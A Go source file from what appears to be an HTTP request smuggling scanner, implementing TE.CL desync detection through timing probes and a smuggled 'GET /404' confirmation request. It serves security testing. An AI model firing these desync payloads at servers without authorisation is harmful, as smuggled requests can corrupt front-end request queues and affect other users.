package smuggler

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
	"smuggler/config"
	"smuggler/smuggler/h1"
	"time"

	"github.com/rs/zerolog/log"
)

type TE struct {
	*DesyncerImpl
}

func (te *TE) Run() bool {
	return te.runTECL()
}

func (te *TE) runTECL() bool {
	log.Info().Str("endpoint", te.URL.String()).Msg("Running TECL desync tests...")
	f, err := os.OpenFile("smuggler/tests/clte/"+config.Glob.Test, os.O_RDONLY, 0644)
	if err != nil {
		log.Warn().Err(err).Msg("")
		return false
	}
	defer f.Close()

	ctr := 0
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		tmp, err := hex.DecodeString(line)
		if err != nil {
			log.Warn().Err(err).Msg("")
			return false
		}
		payload := te.NewPl(string(tmp))
		if te.tecl(payload) {
			ctr++
			if config.Glob.ExitEarly {
				log.Info().
					Str("endpoint", te.URL.String()).
					Str("status", "success").
					Msgf("Test stopped on success: PoC payload stored in /result/%s directory", te.URL.Hostname())
				te.Done <- 1
				return true
			}
		}
	}
	if ctr > 0 {
		log.Info().
			Str("endpoint", te.URL.String()).
			Str("status", "success").
			Msgf("finished TECL/CLTE desync tests: PoC payload stored in /result/%s directory", te.URL.Hostname())
	} else {
		log.Info().
			Str("endpoint", te.URL.String()).
			Str("status", "failure").
			Msg("finished TECL/CLTE desync tests: no issues found")
	}
	return false
}

func (te *TE) tecl(p *h1.Payload) bool {
	p.Body = "0\r\n\r\nG"
	p.Cl = 6

	ctr := 0
	for {
		start := time.Now()
		ret, err := te.H1Test(p)
		if ret != 1 {
			if ret == -1 {
				log.Debug().
					Str("endpoint", te.URL.String()).
					Str("payload", p.HdrPl).
					Err(err).Msg("")
			} else if ret == 2 {
				log.Debug().
					Str("endpoint", te.URL.String()).
					Msg("disconnected before timeout")
			}
			return false
		}
		diff := time.Since(start)
		p.Cl = 5
		ret2, err := te.H1Test(p)
		if ret2 == -1 {
			log.Debug().
				Str("endpoint", te.URL.String()).
				Err(err).Msg("")
			return false
		}
		p.Cl = 6
		if ret2 == 0 {
			ctr++
			if ctr < 3 {
				continue
			}
			log.Info().
				Str("endpoint", te.URL.String()).
				Msgf("Potential TECL issue found - %s@%s://%s%s",
					config.Glob.Method, te.URL.Scheme, te.URL.String(), te.URL.Path)
			inner := fmt.Sprintf("GET /404 HTTP/1.1\r\nHost: %s\r\nContent-Length: 50\r\n\r\nX=", te.URL.Hostname())
			tmp := fmt.Sprintf("1\r\nA\r\n%X\r\n%s\r\n0\r\n\r\n", len(inner), inner)
			p.Body = tmp
			p.Cl = len(fmt.Sprintf("1\r\nA\r\n%X\r\n", len(inner)))
			te.H1Test(p)
			te.H1Test(p)
			te.GenReport(p, diff)
			return true // instead return a bool if sth is found
		}
		log.Debug().
			Str("endpoint", te.URL.String()).
			Str("payload", p.HdrPl).
			Err(err).Msg("TECL timeout on both length 5 and 6")
		return false
	}
}
